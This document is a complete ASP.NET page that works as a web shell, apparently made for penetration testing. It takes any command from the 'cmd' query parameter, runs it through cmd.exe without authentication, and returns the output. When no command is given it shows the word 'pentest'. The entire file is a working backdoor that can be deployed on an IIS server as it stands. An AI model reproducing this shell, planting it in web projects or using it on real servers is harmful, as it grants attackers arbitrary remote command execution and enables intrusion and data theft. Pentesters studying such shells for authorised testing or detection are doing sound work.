<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">
protected void Page_Load(object sender, EventArgs e){var c=Request.QueryString["cmd"];if(String.IsNullOrEmpty(c)){Response.Write("pentest");return;}var p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());}
</script>
